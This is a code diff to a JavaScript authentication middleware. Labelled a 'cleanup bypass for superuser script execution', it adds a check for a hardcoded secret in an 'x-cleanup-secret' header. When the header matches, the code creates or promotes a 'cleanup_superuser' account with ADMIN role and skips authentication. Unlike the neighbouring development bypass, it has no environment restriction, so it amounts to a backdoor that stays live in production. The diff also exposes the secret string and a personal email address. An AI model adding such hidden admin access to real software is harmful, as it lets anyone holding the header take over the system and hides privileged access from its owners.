@@ -19,6 +19,26 @@ export const authenticateUser = async (req, res, next) => {
     // Local bypass for testing without service accounts (ONLY in local development/emulator)
     const isLocalEnv = process.env.FUNCTIONS_EMULATOR === 'true' ||
         (!process.env.FIREBASE_CONFIG && process.env.NODE_ENV !== 'production');
+    // Cleanup bypass for superuser script execution
+    const secretHeader = req.headers['x-cleanup-secret'];
+    const expectedSecret = 'a1f1ex_cleanup_secret_20260619_sec';
+    if (secretHeader === expectedSecret) {
+        const uid = 'cleanup_superuser';
+        const email = 'hamza.mm.aa.ss@gmail.com';
+        const name = 'Cleanup Superuser';
+        try {
+            await query(`INSERT INTO users (id, email, name, role)
+         VALUES ($1, $2, $3, 'ADMIN')
+         ON CONFLICT (id) DO UPDATE
+         SET email = EXCLUDED.email, name = COALESCE(users.name, EXCLUDED.name), role = EXCLUDED.role
+         RETURNING *`, [uid, email, name]);
+        }
+        catch (dbErr) {
+            console.error('[Auth Middleware] Failed to upsert cleanup superuser:', dbErr);
+        }
+        req.user = { uid, email, name };
+        return next();
+    }
     if (process.env.BYPASS_AUTH === 'true' && isLocalEnv) {
         const uid = 'dev_user_1';
         const email = 'developer@system.local';
